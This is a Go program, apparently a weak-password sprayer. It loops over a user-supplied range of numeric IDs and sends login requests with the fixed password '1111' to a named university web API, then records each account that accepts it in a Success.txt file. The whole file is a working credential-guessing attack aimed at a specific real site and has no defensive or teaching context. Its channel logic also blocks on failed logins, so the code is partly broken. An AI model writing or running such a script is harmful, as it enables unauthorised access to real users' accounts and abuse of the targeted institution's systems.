package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	var (
		userStart int
		userStop  int
		password  string
		fileName  string
	)
	fileName = "Success.txt"
	creatFile, err := os.Create(fileName)
	if err != nil {
		fmt.Print("File exsisted")
	}
	defer creatFile.Close()
	fmt.Printf("Type Start ID:\t")
	fmt.Scan(&userStart)
	fmt.Printf("Type Stop ID:\t")
	fmt.Scan(&userStop)
	password = "1111"
	channle := make(chan int)
	for i := userStart; i <= userStop; i++ {
		go tryingAndSaving(i, password, fileName, channle)
	}

	for i := userStart; i <= userStop; i++ {
		<-channle
	}
}

//弱口令尝试
func tryingAndSaving(user int, password, fileName string, channle chan int) {
	//文件操作
	//尝试登陆
	time.Sleep(2 / 1 * (time.Second))
	url := "http://wrggka.whvcse.edu.cn/api/M_User/Login?username=" + strconv.Itoa(user) + "&password=" + password + "&accessKey=1&secretKey=1"
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Requesting too fast!!!\n")
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "\"status\":\"1\"") {
		Date := strconv.Itoa(user) + "---------" + password
		writeFile, _ := os.OpenFile(fileName, os.O_WRONLY|os.O_APPEND, 0664)
		writeFile.WriteString(Date + "\n")
		defer writeFile.Close()
		fmt.Print(Date + "\n")
		fmt.Printf("Found a poor pass User %d\n", user)
		channle <- user
	}
}
